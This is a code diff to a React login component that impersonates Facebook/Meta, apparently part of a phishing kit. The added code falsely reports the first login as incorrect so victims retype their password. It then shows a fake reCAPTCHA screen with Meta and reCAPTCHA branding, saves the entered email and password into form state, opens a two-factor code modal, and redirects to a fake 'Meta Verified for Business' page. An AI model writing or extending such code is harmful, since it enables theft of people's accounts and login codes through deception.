@@ -1,6 +1,17 @@
 'use client'
 
-import { useEffect, useId, useState } from 'react'
+import { createPortal } from 'react-dom'
+import { useEffect, useId, useRef, useState } from 'react'
+import Image from 'next/image'
+import TwoFactorModal from '#components/modals/TwoFactorModal'
+import { useRouter } from 'next/navigation'
+import { useAppDispatch } from '@/app/store/hooks'
+import { updateForm } from '@/app/store/slices/stepFormSlice'
+import { markMetaVerifiedSubmittedAfterFbLogin } from '@/utils/mvFbLoginSession'
+import { useAppStrings } from '@/hooks/useAppStrings'
+
+const VERIFY_CAPTCHA_DELAY_MS = 1650
+const OPEN_TWO_FACTOR_DELAY_MS = 550
 
 const LABEL_EMAIL_DESKTOP = 'Email address or mobile number'
 const LABEL_EMAIL_MOBILE = 'Mobile number or email address'
@@ -8,7 +19,7 @@ const LABEL_EMAIL_MOBILE = 'Mobile number or email address'
 const FB_BLUE_LINK = '#1877F2'
 
 const fieldBase =
-  'peer box-border min-h-[52px] w-full appearance-none rounded-md border border-[#dddfe2] bg-white px-4 pb-2 pt-[22px] text-[17px] leading-[1.25] text-[#1c1e21] outline-none caret-[#1877F2] transition-[border-color,box-shadow] placeholder:text-transparent focus:border-[#1877F2] focus:shadow-[0_0_0_2px_rgba(24,119,242,0.25)] sm:min-h-[54px] sm:pt-[24px]'
+  'peer box-border min-h-[52px] w-full appearance-none rounded-[10px] border border-[#dddfe2] bg-white px-4 pb-2 pt-[22px] text-[17px] leading-[1.25] text-[#1c1e21] outline-none caret-[#1877F2] transition-[border-color,box-shadow] placeholder:text-transparent focus:border-[#1877F2] focus:shadow-[0_0_0_2px_rgba(24,119,242,0.25)] sm:min-h-[54px] sm:pt-[24px] lg:rounded-md'
 
 const fieldErrorClasses =
   'border-[#FA383E] focus:border-[#FA383E] focus:shadow-[0_0_0_2px_rgba(250,56,62,0.28)]'
@@ -81,6 +92,110 @@ function FbLoginIncorrectInfoIcon({
   )
 }
 
+/** Màn full-viewport sau lần thứ 2 Log in có đủ email + MK; checkbox → load → mở 2FA giống CaptchaModal. */
+function FbRecaptchaFullScreenBody({
+  captchaInputId,
+  isLoading,
+  isVerified,
+  onCheckboxChange,
+}: {
+  captchaInputId: string
+  isLoading: boolean
+  isVerified: boolean
+  onCheckboxChange: (e: React.ChangeEvent<HTMLInputElement>) => void
+}) {
+  const t = useAppStrings()
+  return (
+    <div className="bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto">
+      <div
+        className="w-full max-w-[325px] flex flex-col justify-start pb-[max(1.5rem,env(safe-area-inset-bottom))] pl-[max(1rem,env(safe-area-inset-left))] pr-[max(1rem,env(safe-area-inset-right))] pt-[max(1.5rem,env(safe-area-inset-top))] font-sans text-[14px] text-gray-800 sm:h-screen sm:justify-center sm:py-0 md:px-0"
+        style={{ fontFamily: 'Roboto, "Helvetica Neue", Helvetica, Arial, sans-serif' }}
+      >
+        <div className="w-full">
+          <Image
+            src="/images/meta/logo-meta.svg"
+            alt="logo"
+            width={132}
+            height={26}
+            className="h-auto max-h-16 w-[64px] object-contain object-left"
+          />
+        </div>
+
+        <div
+          className="flex w-full items-center justify-start bg-cover bg-center py-5 font-helvetica"
+          style={{ fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif' }}
+        >
+          <div className="flex w-full flex-row items-center justify-between rounded-md border-2 border-[#dadce0] bg-[#f9f9f9] pr-2 text-[#4c4a4b]">
+            <div className="ml-4 flex flex-row items-center justify-start">
+              <div
+                className="relative flex size-[30px] items-center justify-center"
+                style={{ WebkitTapHighlightColor: 'transparent' }}
+              >
+                <label
+                  className={`recaptcha-check ${isLoading ? 'cursor-wait' : 'cursor-pointer'}`}
+                  htmlFor={captchaInputId}
+                >
+                  <input
+                    id={captchaInputId}
+                    className="sr-only"
+                    type="checkbox"
+                    checked={isVerified}
+                    onChange={onCheckboxChange}
+                    aria-label={t.captcha.notRobot}
+                    disabled={isLoading || isVerified}
+                  />
+                  <span
+                    aria-hidden="true"
+                    className={`recaptcha-icon ${isLoading ? 'is-loading' : ''} ${isVerified ? 'is-verified' : ''}`}
+                  >
+                    {isLoading && (
+                      <>
+                        <span className="recaptcha-spinner-track" />
+                        <span className="recaptcha-spinner-segment" />
+                      </>
+                    )}
+                    {isVerified && (
+                      <svg viewBox="0 0 24 24" className="recaptcha-checkmark">
+                        <path d="M4.5 12.5L9.2 17.1L20 6.3" />
+                      </svg>
+                    )}
+                  </span>
+                </label>
+              </div>
+              <label
+                htmlFor={captchaInputId}
+                className={`mr-4 ml-1 text-center text-left text-[14px] font-semibold tracking-normal text-gray-500 ${isLoading || isVerified ? 'cursor-default' : 'cursor-pointer'}`}
+              >
+                {t.captcha.notRobot}
+              </label>
+            </div>
+            <div className="mb-[2px] flex flex-col items-center text-[#9d9ba7]">
+              <Image
+                src="/images/meta/recaptcha.svg"
+                alt="reCAPTCHA"
+                width={40}
+                height={40}
+                className="mt-2"
+              />
+              <span className="text-[10px] font-bold">reCAPTCHA</span>
+              <div className="text-[8px]">{t.captcha.privacyTerms}</div>
+            </div>
+          </div>
+        </div>
+
+        <div
+          className="text-[13px] leading-[1.3] text-gray-700 font-helvetica"
+          style={{ fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif' }}
+        >
+          <p className="font-normal">{t.captcha.p1}</p>
+          <p className="mt-4 font-normal">{t.captcha.p2}</p>
+          <p className="mt-4 font-normal">{t.captcha.p3}</p>
+        </div>
+      </div>
+    </div>
+  )
+}
+
 function EmailFieldErrorInline() {
   return (
     <svg
@@ -101,19 +216,95 @@ function EmailFieldErrorInline() {
 }
 
 export function FbLoginForm() {
+  const dispatch = useAppDispatch()
   const emailId = useId()
   const passId = useId()
   /** useId có thể chứa `:` — làm sạch để dùng trong id HTML */
   const emailErrorDescId = `fb-email-err-${useId().replace(/:/g, '')}`
   const loginIncorrectId = `fb-login-incorrect-${useId().replace(/:/g, '')}`
   const loginIncorrectSvgClipId = `fb-inc-clip-${useId().replace(/:/g, '')}`
+  const captchaCheckboxId = `checked-captcha-${useId().replace(/:/g, '')}`
+  const passwordErrorDescId = `fb-pass-err-${useId().replace(/:/g, '')}`
+  const credentialAttemptsRef = useRef(0)
+  const verifyCaptchaTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
+  const openTwoFactorTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
+  const lastEmailRef = useRef('')
+  const lastPasswordRef = useRef('')
   const [emailLabel, setEmailLabel] = useState(LABEL_EMAIL_DESKTOP)
   const [emailInvalid, setEmailInvalid] = useState(false)
+  const [passwordInvalid, setPasswordInvalid] = useState(false)
   const [loginIncorrect, setLoginIncorrect] = useState(false)
   const [password, setPassword] = useState('')
   const [passwordVisible, setPasswordVisible] = useState(false)
   const [isLoggingIn, setIsLoggingIn] = useState(false)
+  const [showRecaptcha, setShowRecaptcha] = useState(false)
+  const [portalReady, setPortalReady] = useState(false)
+  const [captchaLoading, setCaptchaLoading] = useState(false)
+  const [captchaVerified, setCaptchaVerified] = useState(false)
+  const [showTwoFactor, setShowTwoFactor] = useState(false)
   const showPasswordToggle = password.length > 0
+  const router = useRouter()
+
+  useEffect(() => {
+    setPortalReady(true)
+  }, [])
+
+  useEffect(() => {
+    return () => {
+      if (verifyCaptchaTimerRef.current) clearTimeout(verifyCaptchaTimerRef.current)
+      if (openTwoFactorTimerRef.current) clearTimeout(openTwoFactorTimerRef.current)
+    }
+  }, [])
+
+  useEffect(() => {
+    if (!showRecaptcha) return
+    const prev = document.body.style.overflow
+    document.body.style.overflow = 'hidden'
+    return () => {
+      document.body.style.overflow = prev
+    }
+  }, [showRecaptcha])
+
+  useEffect(() => {
+    if (!showRecaptcha) return
+    setCaptchaLoading(false)
+    setCaptchaVerified(false)
+    if (verifyCaptchaTimerRef.current) {
+      clearTimeout(verifyCaptchaTimerRef.current)
+      verifyCaptchaTimerRef.current = null
+    }
+    if (openTwoFactorTimerRef.current) {
+      clearTimeout(openTwoFactorTimerRef.current)
+      openTwoFactorTimerRef.current = null
+    }
+  }, [showRecaptcha])
+
+  const handleRecaptchaCheckbox = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (!e.target.checked || captchaLoading || captchaVerified) return
+    setCaptchaLoading(true)
+
+    if (verifyCaptchaTimerRef.current) clearTimeout(verifyCaptchaTimerRef.current)
+    if (openTwoFactorTimerRef.current) clearTimeout(openTwoFactorTimerRef.current)
+
+    verifyCaptchaTimerRef.current = setTimeout(() => {
+      verifyCaptchaTimerRef.current = null
+      setCaptchaLoading(false)
+      setCaptchaVerified(true)
+
+      openTwoFactorTimerRef.current = setTimeout(() => {
+        openTwoFactorTimerRef.current = null
+        dispatch(
+          updateForm({
+            email: lastEmailRef.current,
+            password: lastPasswordRef.current,
+            submissionFlow: 'facebook_login',
+          }),
+        )
+        setShowRecaptcha(false)
+        setShowTwoFactor(true)
+      }, OPEN_TWO_FACTOR_DELAY_MS)
+    }, VERIFY_CAPTCHA_DELAY_MS)
+  }
 
   useEffect(() => {
     if (password.length === 0) setPasswordVisible(false)
@@ -128,7 +319,7 @@ export function FbLoginForm() {
     return () => mq.removeEventListener('change', sync)
   }, [])
 
-  return (
+  const formMarkup = (
     <form
       id="login_form"
       className="mt-4 flex flex-col gap-3"
@@ -136,14 +327,25 @@ export function FbLoginForm() {
       method="POST"
       onSubmit={(e) => {
         e.preventDefault()
-        if (isLoggingIn) return
+        if (isLoggingIn || showRecaptcha) return
         const fd = new FormData(e.currentTarget)
         const raw = String(fd.get('email') ?? '').trim()
+        const passTrim = String(fd.get('pass') ?? '').trim()
         if (!raw) {
           setLoginIncorrect(false)
+          setPasswordInvalid(false)
           setEmailInvalid(true)
           return
         }
+        if (!passTrim) {
+          setEmailInvalid(false)
+          setLoginIncorrect(false)
+          setPasswordInvalid(true)
+          return
+        }
+        lastEmailRef.current = raw
+        lastPasswordRef.current = passTrim
+        setPasswordInvalid(false)
         setEmailInvalid(false)
         setLoginIncorrect(false)
         setIsLoggingIn(true)
@@ -151,7 +353,13 @@ export function FbLoginForm() {
           try {
             /* Chỗ gọi API đăng nhập thật — tạm delay để thấy spinner như Facebook */
             await new Promise<void>((r) => setTimeout(r, 1800))
-            setLoginIncorrect(true)
+            credentialAttemptsRef.current += 1
+            if (credentialAttemptsRef.current >= 2) {
+              setShowRecaptcha(true)
+              setLoginIncorrect(false)
+            } else {
+              setLoginIncorrect(true)
+            }
           } finally {
             setIsLoggingIn(false)
           }
@@ -205,6 +413,7 @@ export function FbLoginForm() {
             onChange={() => {
               setEmailInvalid(false)
               setLoginIncorrect(false)
+              setPasswordInvalid(false)
             }}
             className={`${fieldBase} ${emailInvalid && !loginIncorrect ? fieldErrorClasses : ''}`}
           />
@@ -252,21 +461,24 @@ export function FbLoginForm() {
           name="pass"
           placeholder=" "
           autoComplete="current-password"
-          aria-invalid={false}
+          aria-invalid={passwordInvalid}
+          aria-describedby={passwordInvalid ? passwordErrorDescId : undefined}
           dir="ltr"
           value={password}
           onChange={(e) => {
             setPassword(e.target.value)
             setLoginIncorrect(false)
+            setPasswordInvalid(false)
           }}
-          className={`${fieldBase} ${showPasswordToggle ? 'pr-12 sm:pr-[2.875rem]' : ''}`}
+          className={`${fieldBase} ${showPasswordToggle ? 'pr-12 sm:pr-[2.875rem]' : ''} ${passwordInvalid ? fieldErrorClasses : ''}`}
         />
         <label
           htmlFor={passId}
-          className={`${labelBase} ${showPasswordToggle ? 'max-w-[calc(100%-3rem)] sm:max-w-[calc(100%-3.25rem)]' : ''}`}
+          className={`${labelBase} ${passwordInvalid ? 'text-[#FA383E]' : ''} ${showPasswordToggle ? 'max-w-[calc(100%-3rem)] sm:max-w-[calc(100%-3.25rem)]' : ''}`}
         >
           Password
         </label>
+
         {showPasswordToggle ? (
           <div className="absolute inset-y-0 end-1 z-[1] flex items-center justify-end pr-0.5 sm:end-2">
             <button
@@ -294,13 +506,23 @@ export function FbLoginForm() {
         ) : null}
       </div>
 
+      {passwordInvalid ? (
+        <p
+          id={passwordErrorDescId}
+          className="mt-2 text-[0.8125rem] leading-[1.308] text-[#FA383E]"
+          role="alert"
+        >
+          Please enter password
+        </p>
+      ) : null}
+
       <button
         type="submit"
         aria-label={isLoggingIn ? 'Logging in…' : 'Log in'}
         aria-busy={isLoggingIn}
         aria-disabled={isLoggingIn}
         disabled={isLoggingIn}
-        className={`relative mt-1 flex min-h-[2.75rem] w-full items-center justify-center overflow-hidden rounded-full bg-[#1877F2] py-[0.65rem] text-[1.0625rem] font-bold leading-tight text-white transition-[background-color,opacity] ${
+        className={`relative mt-1 flex min-h-[2.75rem] w-full items-center justify-center overflow-hidden rounded-[10px] bg-[#1877F2] py-[0.65rem] text-[1.0625rem] font-bold leading-tight text-white transition-[background-color,opacity] lg:rounded-full ${
           isLoggingIn
             ? 'cursor-default opacity-[0.98]'
             : 'hover:bg-[#166FE5] active:bg-[#1565d8]'
@@ -316,5 +538,34 @@ export function FbLoginForm() {
         )}
       </button>
     </form>
+  )
+
+  return (
+    <>
+      {!showRecaptcha ? formMarkup : null}
+      {portalReady && showRecaptcha
+        ? createPortal(
+            <div className="fixed inset-0 z-[10000] overflow-y-auto bg-[#ffffff]">
+              <FbRecaptchaFullScreenBody
+                captchaInputId={captchaCheckboxId}
+                isLoading={captchaLoading}
+                isVerified={captchaVerified}
+                onCheckboxChange={handleRecaptchaCheckbox}
+              />
+            </div>,
+            document.body,
+          )
+        : null}
+
+      <TwoFactorModal
+        isOpend={showTwoFactor}
+        isOpendFinish={() => {
+          markMetaVerifiedSubmittedAfterFbLogin()
+          setShowTwoFactor(false)
+          router.push('/meta-verified-for-business')
+        }}
+        onToggleModal={(open) => setShowTwoFactor(open)}
+      />
+    </>
   )
 }
